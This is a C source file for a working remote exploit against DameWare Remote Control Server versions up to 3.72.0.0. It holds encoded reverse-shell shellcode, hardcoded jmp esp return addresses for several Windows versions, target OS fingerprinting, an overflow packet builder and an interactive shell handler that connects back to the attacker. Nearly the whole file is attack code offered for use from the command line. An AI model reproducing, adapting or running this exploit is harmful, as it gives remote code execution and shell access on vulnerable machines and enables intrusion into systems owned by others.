

/*******************************************************************************
 *	
 *		DameWare Remote Control Server Stack Overflow Exploit 
 *		
 *		Discovered by:			wirepair
 *		Exploit by:				Adik [ netmaniac (at) hotmail.KG ]		
 *
 *		Vulnerable Versions:	<= 3.72.0.0
 *		Tested on:				3.72.0.0 Win2k SP3 & WinXp SP3
 *		Payload:				Reverse Connect Shellcode, exits gracefully 
 *								doesn't terminate remote process.
 *		
 * [16/Dec/2003] Bishkek
 *******************************************************************************/


#include <stdio.h>
#include <string.h>
#include <winsock.h>
//#include "netmaniac.h"
#pragma comment(lib,"ws2_32") 
#define ACCEPT_TIMEOUT	10
#define RECVTIMEOUT		15

#define ID_UNKNOWN		0
#define ID_WIN2K		1
#define ID_WINXP		2
#define ID_WIN2K3		3
#define ID_WINNT		4
#define VER				"0.5"	
//#include "dmware.rc"

/*******************************************************************************/		
	unsigned char send_buff[40] = {
	0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0xC3, 0xF5, 0x28, 0x5C, 0x8F, 0xC2, 0x0D, 0x40, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00
	};

	unsigned char kyrgyz_rshell[] = { //418
	0xEB, 0x03, 0x5D, 0xEB, 0x05, 0xE8, 0xF8, 0xFF, 0xFF, 0xFF, 0x8B, 0xC5, 0x83, 0xC0, 0x11, 0x33, 
	0xC9, 0x66, 0xB9, 0xa2, 0x01, 0x80, 0x30, 0x88, 0x40, 0xE2, 0xFA,
	0xDD, 0x03, 0x64, 0x03, 0x7C, 0xEE, 0x09, 0x64, 0x08, 0x88, 0x60, 0xAE, 0x89, 0x88, 0x88, 0x01, 
	0xCE, 0x74, 0x77, 0xFE, 0x74, 0xE0, 0x06, 0xC6, 0x86, 0x64, 0x60, 0xA3, 0x89, 0x88, 0x88, 0x01, 
	0xCE, 0x64, 0xE0, 0xBB, 0xBA, 0x88, 0x88, 0xE0, 0xFF, 0xFB, 0xBA, 0xD7, 0xDC, 0x77, 0xDE, 0x64, 
	0x01, 0xCE, 0x70, 0x77, 0xFE, 0x74, 0xE0, 0x25, 0x51, 0x8D, 0x46, 0x60, 0x82, 0x89, 0x88, 0x88, 
	0x01, 0xCE, 0x56, 0x77, 0xFE, 0x74, 0xE0, 0xFA, 0x76, 0x3B, 0x9E, 0x60, 0x72, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x52, 0x77, 0xFE, 0x74, 0xE0, 0x67, 0x46, 0x68, 0xE8, 0x60, 0x62, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x5E, 0x77, 0xFE, 0x70, 0xE0, 0x43, 0x65, 0x74, 0xB3, 0x60, 0x52, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x7C, 0x77, 0xFE, 0x70, 0xE0, 0x51, 0x81, 0x7D, 0x25, 0x60, 0x42, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x78, 0x77, 0xFE, 0x70, 0xE0, 0x64, 0x71, 0x22, 0xE8, 0x60, 0x32, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x60, 0x77, 0xFE, 0x70, 0xE0, 0x6F, 0xF1, 0x4E, 0xF1, 0x60, 0x22, 0x88, 0x88, 0x88, 
	0x01, 0xCE, 0x6A, 0xBB, 0x77, 0x09, 0x64, 0x7C, 0x89, 0x88, 0x88, 0xDC, 0xE0, 0x89, 0x89, 0x88, 
	0x88, 0x77, 0xDE, 0x7C, 0xD8, 0xD8, 0xD8, 0xD8, 0xC8, 0xD8, 0xC8, 0xD8, 0x77, 0xDE, 0x78, 0x03, 
	0x50, 0xE0, 0x48, 0x20, 0xB7, 0x89, 0xE0, 0x8A, 0x88, 0xAA, 0x99, 0x03, 0x44, 0xE2, 0x98, 0xD9, 
	0xDB, 0x77, 0xDE, 0x60, 0x0D, 0x48, 0xFD, 0xD2, 0xE0, 0xEB, 0xE5, 0xEC, 0x88, 0x01, 0xEE, 0x5A, 
	0x0B, 0x4C, 0x24, 0x05, 0xB4, 0xAC, 0xBB, 0x48, 0xBB, 0x41, 0x08, 0x49, 0x9D, 0x23, 0x6A, 0x75, 
	0x4E, 0xCC, 0xAC, 0x98, 0xCC, 0x76, 0xCC, 0xAC, 0xB5, 0x76, 0xCC, 0xAC, 0xB6, 0x01, 0xD4, 0xAC, 
	0xC0, 0x01, 0xD4, 0xAC, 0xC4, 0x01, 0xD4, 0xAC, 0xD8, 0x05, 0xCC, 0xAC, 0x98, 0xDC, 0xD8, 0xD9, 
	0xD9, 0xD9, 0x4E, 0xCC, 0xAC, 0x8B, 0x80, 0xC9, 0xD9, 0xC1, 0xD9, 0xD9, 0x77, 0xFE, 0x5A, 0xD9, 
	0x77, 0xDE, 0x52, 0x03, 0x44, 0xE2, 0x77, 0x77, 0xB9, 0x77, 0xDE, 0x56, 0x03, 0x40, 0xDB, 0x77, 
	0xDE, 0x6A, 0x77, 0xDE, 0x5E, 0xDE, 0xEC, 0x29, 0xB8, 0x88, 0x88, 0x88, 0x03, 0xC8, 0x84, 0x03, 
	0xF8, 0x94, 0x25, 0x03, 0xC8, 0x80, 0xD6, 0x4A, 0x8C, 0x88, 0xDB, 0xDD, 0xDE, 0xDF, 0x03, 0xE4, 
	0xAC, 0x90, 0x03, 0xCD, 0xB4, 0x03, 0xDC, 0x8D, 0xF0, 0x8B, 0x5D, 0x03, 0xC2, 0x90, 0x03, 0xD2, 
	0xA8, 0x8B, 0x55, 0x6B, 0xBA, 0xC1, 0x03, 0xBC, 0x03, 0x8B, 0x7D, 0xBB, 0x77, 0x74, 0xBB, 0x48, 
	0x24, 0xB2, 0x4C, 0xFC, 0x8F, 0x49, 0x47, 0x85, 0x8B, 0x70, 0x63, 0x7A, 0xB3, 0xF4, 0xAC, 0x9C, 
	0xFD, 0x69, 0x03, 0xD2, 0xAC, 0x8B, 0x55, 0xEE, 0x03, 0x84, 0xC3, 0x03, 0xD2, 0x94, 0x8B, 0x55, 
	0x03, 0x8C, 0x03, 0x8B, 0x4D, 0x63, 0x8A, 0xBB, 0x48, 0x03, 0x5D, 0xD7, 0xD6, 0xD5, 0xD3, 0x4A, 
	0x8C, 0x88
	};

/*******************************************************************************/
long gimmeip(char *hostname);
void cmdshell (int sock);
int check_os(char *host,unsigned short target_port, unsigned int *sp);

struct timeval tv;
fd_set fds;		
char recv_buff1[5000]="";
/***********************-( os jmp esp offsets )-********************************/
struct sp_levels
{
	unsigned long eip;
	char library[20];
} ;
/*************-[ offsets grabbed from www.metasploit.com ]-*********************/
struct
{
	//int sp;
	//unsigned long eip;
	char os_type[10];
	struct sp_levels sp[7];

} target_os[]=
{
	{
		"UNKNOWN",{{0,""},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}		
	},
	{
			"WIN 2000",
			{{ 0x750362c3,"ws2_32.dll" },{ 0x75035173,"ws2_32.dll" },{ 0x7503431b,"ws2_32.dll" },
			{  0x77db912b,"advapi32.dll" },{ 0x7c372063,"advapi32.dll" },{ 0,"" },{ 0,"" }	} 
	},
	{
			"WIN XP",
			{ 	{ 0x71ab7bfb,"ws2_32.dll" },{ 0x71ab7bfb,"ws2_32.dll" },{ 0,"" },
				{ 0,"" },{ 0,"" },{ 0,"" },{ 0,"" }	} //2 sp on winxp
	},
	{
			"WIN 2003",
			{{0x77db565c,"advapi32.dll"},{0,""},{0,""},{0,""},{0,""},{0,""},{0,""}}//SP 0??	
	},
	{
			"WIN NT4",
			{ // only SP3 + SP 6 r filled in
			{ 0x77777777,"unknown.dll" },{ 0x77777776,"unknown.dll" },{ 0x77777775,"unknown.dll" },
			{ 0x77f326c6,"kernel32.dll" },{ 0x77777773,"unknown.dll" },{ 0x77777772,"unknown.dll" },
			{ 0x77f32836,"kernel32.dll" }			
			}//6 SP		
	}

};
/****************************************************************************/


int main(int argc,char *argv[])
{     
		WSADATA wsaData;						
		struct sockaddr_in targetTCP, localTCP, inAccTCP;
		int sockTCP,s,localSockTCP,accSockTCP, acsz,switchon;
		unsigned char send_packet[4135]="";
		unsigned short local_port, target_port;
		unsigned long local_ip, target_ip;
		unsigned int os_sp=0;
		int os_ver=0;
		printf("\n\t...oO DameWare Remote Control Server Overflow Exploit Oo...\n\n"
				   "\t\t-( by Adik netmaniac[at]hotmail.KG )-\n\n");
		printf(" - Versions vulnerable: <= DWRCS 3.72.0.0\n");
		printf(" - Tested on: DWRCS ver: 3.72.0.0 Win2k SP3 & WinXP SP1\n\n");
		if(argc < 4)
		{
			
			printf(" Usage: %s <TargetIP> <TargetPort> <YourIp> <YourPort>\n"
					" eg: %s 10.0.0.1 6129 10.0.0.2 21\n\n",argv[0],argv[0]);
			return 1;			
		}				
		
		WSAStartup(0x0202, &wsaData);				
		target_port = atoi(argv[2]);		        		

		local_port = htons((unsigned short)atoi(argv[4]));
		local_ip = inet_addr(argv[3]);
		local_port ^= 0x8888;
		local_ip ^= 0x88888888;

		*(unsigned long *)&kyrgyz_rshell[194+27] = local_ip;
		*(unsigned short *)&kyrgyz_rshell[201+27] = local_port;		

		printf( "[*] Target IP:\t%s \tPort: %s\n"
				"[*] Local IP:\t%s \tListening Port: %s\n\n",argv[1],argv[2],argv[3],argv[4]);

		target_ip=gimmeip(argv[1]);	
        memset(&targetTCP, 0, sizeof(targetTCP));
		memset(&localTCP, 0, sizeof(localTCP));
		
        targetTCP.sin_family = AF_INET;
        targetTCP.sin_addr.s_addr = target_ip;
        targetTCP.sin_port = htons(target_port);				
						
		localTCP.sin_family = AF_INET;
        localTCP.sin_addr.s_addr = INADDR_ANY;
        localTCP.sin_port = htons((unsigned short)atoi(argv[4]));

		printf("[*] Initializing sockets...");

        if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("\t\t\t[ FAILED ]\n Socket1 not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		if ((localSockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("\t\t\t[ FAILED ]\n Socket2 not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}
		printf("\t\t\t[ OK ]\n");

		printf("[*] Binding to local port: %s...",argv[4]);

		if(bind(localSockTCP,(struct sockaddr *)&localTCP,sizeof(localTCP)) !=0)
		{
				printf("\t\t[ FAILED ]\n Failed binding to port: %s! Exiting...\n",argv[4]);
				WSACleanup();
                return 1;
		}

		printf("\t\t[ OK ]\n");
		printf("[*] Setting up a listener...");
		if(listen(localSockTCP,1) != 0)
		{
				printf("\t\t\t[ FAILED ]\nFailed to listen on port: %s! Exiting...\n",argv[4]);
				WSACleanup();
                return 1;
		}
		printf("\t\t\t[ OK ]\n");
		os_ver = check_os(argv[1],(unsigned short)atoi(argv[2]),&os_sp);
		
		printf(" EIP: 0x%x (%s)\n\n",target_os[os_ver].sp[os_sp].eip,target_os[os_ver].sp[os_sp].library);
		printf("[*] Constructing packet for %s SP: %d...",target_os[os_ver].os_type,os_sp);				
		memcpy(send_packet,"\x10\x27",2);				
		//memcpy(send_packet+500,"neTmaNiac",strlen("netmaniac"));
		memset(send_packet+0xc4+9,0x90,700);		
		
		*(unsigned long*)&send_packet[516] = target_os[os_ver].sp[os_sp].eip;

		memcpy(send_packet+520,kyrgyz_rshell,strlen(kyrgyz_rshell));		
		memcpy(send_packet+0x3d0,"neTmaNiac",9);				
		memcpy(send_packet+0x5b4+0x24,"netmaniac was here",18);				
		memcpy(send_packet+0x5b4+0x128,"12/12/04 13:13:13",17);				
		memcpy(send_packet+0x5b4+0x538,"netninjaz_place",15);				
		memcpy(send_packet+0x5b4+0x5b4+0x88,"131.131.131.131",16);				
		memcpy(send_packet+0x5b4+0x5b4+0x394,"3.72.0.0",strlen("3.72.0.0"));
				
		printf("\t[ OK ]\n");
		
		printf("[*] Connecting to %s:%s...",argv[1],argv[2]);		

		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("\n[x] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 		
		printf("\t\t[ OK ]\n");

		switchon=1;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	
		tv.tv_sec = RECVTIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sockTCP,&fds);	

		if((select(1,&fds,0,0,&tv))>0)
		{
			recv(sockTCP, recv_buff1, sizeof(recv_buff1),0);			
		}
		else
		{
			printf("[x] Timeout! Failed to recv packet.\n");
			exit(1);
		}		
		
		//DumpMemory(recv_buff1,50);
		memset(recv_buff1,0,sizeof(recv_buff1));
		
		switchon=0;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	

		if (send(sockTCP, send_buff, sizeof(send_buff),0) == -1)
		{
				printf("[x] Failed to inject packet! Exiting...\n");
				WSACleanup();
                return 1;
		}
		
		switchon=1;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	
		tv.tv_sec = RECVTIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sockTCP,&fds);	

		if((select(sockTCP+1,&fds,0,0,&tv))>0)
		{
			recv(sockTCP, recv_buff1, sizeof(recv_buff1),0);			
			switchon=0;
			ioctlsocket(sockTCP,FIONBIO,&switchon);				
			if (send(sockTCP, send_packet, sizeof(send_packet),0) == -1)
			{
				printf("[x] Failed to inject packet2! Exiting...\n");
				WSACleanup();
                return 1;
			}
		}
		else
		{
				printf("\n[x] Timeout! Failed to receive packet! Exiting...\n");
				WSACleanup();
                return 1;
		}		
			
		printf("[*] Packet injected!\n");
		closesocket(sockTCP);				
		printf("[*] Waiting for incoming connection...\r");

		switchon=1;
		ioctlsocket(localSockTCP,FIONBIO,&switchon);	
		tv.tv_sec = ACCEPT_TIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(localSockTCP,&fds);	

		if((select(1,&fds,0,0,&tv))>0)
		{
			acsz = sizeof(inAccTCP);
			accSockTCP = accept(localSockTCP,(struct sockaddr *)&inAccTCP, &acsz);
			printf("[*] Connection request accepted: %s:%d\n", inet_ntoa(inAccTCP.sin_addr), (int)ntohs(inAccTCP.sin_port));
			printf("[*] Dropping to shell...\n\n");
			cmdshell(accSockTCP);
		}
		else
		{
				printf("\n[x] Exploit appears to have failed!\n");
				WSACleanup();
		}
		
        return 0;
}
/*********************************************************************************/
int check_os(char *host,unsigned short target_port, unsigned int *sp)
{
	int sockTCP,switchon;
	struct sockaddr_in targetTCP;
	struct timeval tv;
	fd_set fds;
	
	memset(&targetTCP,0,sizeof(targetTCP));	
	targetTCP.sin_family = AF_INET;
    targetTCP.sin_addr.s_addr = inet_addr(host);
    targetTCP.sin_port = htons(target_port);

	    if ((sockTCP = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		{
				printf("\t\t\t[ FAILED ]\n Socket1 not initialized! Exiting...\n");
				WSACleanup();
                return 1;
		}		

		if(connect(sockTCP,(struct sockaddr *)&targetTCP, sizeof(targetTCP)) != 0)
		{
			printf("[x] Connection to host failed! Exiting...\n");
			WSACleanup();
			exit(1);
		} 	

		switchon=1;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	
		tv.tv_sec = RECVTIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sockTCP,&fds);	

		if((select(1,&fds,0,0,&tv))>0)
		{
			recv(sockTCP, recv_buff1, sizeof(recv_buff1),0);			
		}
		else
		{
			printf("[x] Timeout! Doesn't appear to b a DMWRCS\n");
			exit(1);
		}

		switchon=0;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	

		if (send(sockTCP, send_buff, sizeof(send_buff),0) == -1)
		{
				printf("[x] Failed to inject packet! Exiting...\n");
				WSACleanup();
                return 1;
		}
		
		switchon=1;
		ioctlsocket(sockTCP,FIONBIO,&switchon);	
		tv.tv_sec = RECVTIMEOUT;
		tv.tv_usec = 0;
		FD_ZERO(&fds);
		FD_SET(sockTCP,&fds);	

		if((select(sockTCP+1,&fds,0,0,&tv))>0)
		{
			recv(sockTCP, recv_buff1, sizeof(recv_buff1),0);			
			closesocket(sockTCP);	
		}
		else
		{
				printf("\n[x] Timeout! Failed to receive packet! Exiting...\n");
				WSACleanup();
                return 1;
		}				
		
		printf("\n OS Info   : ");
		if(recv_buff1[8]==5 && recv_buff1[12]==0)
		{		
			printf("WIN2000 [ver 5.0.%d]\n SP String : %-1.20s\n\n",*(unsigned short *)&recv_buff1[16],&recv_buff1[24]);
			*sp = atoi(&recv_buff1[37]);
			closesocket(sockTCP);	
			return ID_WIN2K;
		}
		else if(recv_buff1[8]==5 && recv_buff1[12]==1)
		{		
			printf("WINXP [ver 5.1.%d]\n SP String : %-1.20s\n\n",*(unsigned short *)&recv_buff1[16],&recv_buff1[24]);
			*sp = atoi(&recv_buff1[37]);
			closesocket(sockTCP);	
			return ID_WINXP;
		}
		else if(recv_buff1[8]==5 && recv_buff1[12]==2)
		{			
			printf("WIN2003 [ver 5.2.%d]\n SP String : %-1.20s\n\n",*(unsigned short *)&recv_buff1[16],&recv_buff1[24]);
			*sp = atoi(&recv_buff1[37]);
			closesocket(sockTCP);	
			return ID_WIN2K3;
		}
		else if(recv_buff1[8]==4)
		{		
			printf("WINNT4\n SP String : %-1.20s\n\n",&recv_buff1[24]);
			*sp = atoi(&recv_buff1[37]);
			closesocket(sockTCP);	
			return ID_WINNT;
		} 
		else
		{
			printf("UNKNOWN\n");
			closesocket(sockTCP);	
			return ID_UNKNOWN;
		}		
		
}
/*********************************************************************************/
long gimmeip(char *hostname) 
{
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) < 0) 
	{
		if ((he = gethostbyname(hostname)) == NULL) 
		{
			printf("[x] Failed to resolve host: %s! Exiting...\n\n",hostname);
			WSACleanup();
			exit(1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}
/*********************************************************************************/
void cmdshell (int sock)
{
 struct timeval tv;
 int length;
 unsigned long o[2];
 char buffer[1000];
 
 tv.tv_sec = 1;
 tv.tv_usec = 0;

 while (1) 
 {
	o[0] = 1;
	o[1] = sock;	

	length = select (0, (fd_set *)&o, NULL, NULL, &tv);
	if(length == 1)
	{
		length = recv (sock, buffer, sizeof (buffer), 0);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
		length = write (1, buffer, length);
		if (length <= 0) 
		{
			printf ("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
	}
	else
	{
		length = read (0, buffer, sizeof (buffer));
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
		length = send(sock, buffer, length, 0);
		if (length <= 0) 
		{
			printf("[x] Connection closed.\n");
			WSACleanup();
			return;
		}
	}
}

}
/*********************************************************************************/